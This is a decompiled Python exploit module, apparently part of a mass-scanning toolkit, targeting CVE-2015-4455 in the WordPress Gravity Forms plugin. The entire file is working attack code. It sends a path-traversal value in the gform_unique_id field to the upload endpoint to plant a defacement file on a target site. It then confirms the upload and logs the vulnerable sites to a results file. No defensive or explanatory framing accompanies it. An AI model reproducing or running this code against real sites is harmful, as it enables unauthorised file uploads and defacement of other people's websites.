# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2015_4455_gravityformsindex.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
index = 'files/rock.jpg'

def Exploit(site):
    try:
        UserAgent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
        fileDeface = {'file': open(index, 'rb')}
        post_data = {'field_id': '3','form_id': '1','gform_unique_id': '../../../../','name': 'vuln.htm'}
        post_data2 = {'field_id': '3','form_id': '1','gform_unique_id': '../../../../../','name': 'vuln.htm'}
        url = 'http://' + site + '/?gf_page=upload'
        requests.post(url, files=fileDeface, data=post_data, headers=UserAgent, timeout=5)
        requests.post(url, files=fileDeface, data=post_data2, headers=UserAgent, timeout=5)
        CheckIndex = requests.get('http://' + site + '/_input_3_vuln.htm', timeout=5, headers=Headers)
        CheckIndex2 = requests.get('http://' + site + '/wp-content/_input_3_vuln.htm', timeout=5, headers=Headers)
        if 'Vuln!!' in str(CheckIndex.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/_input_3_vuln.htm' + '\n')
            return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
        if 'Vuln!!' in str(CheckIndex2.content):
            with open('result/Index_results.txt', 'a') as writer:
                writer.write(site + '/wp-content/_input_3_vuln.htm' + '\n')
            return printModule.returnYes(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')
    except:
        return printModule.returnNo(site, 'CVE-2015-4455', 'Gravity forms Index', 'Wordpress')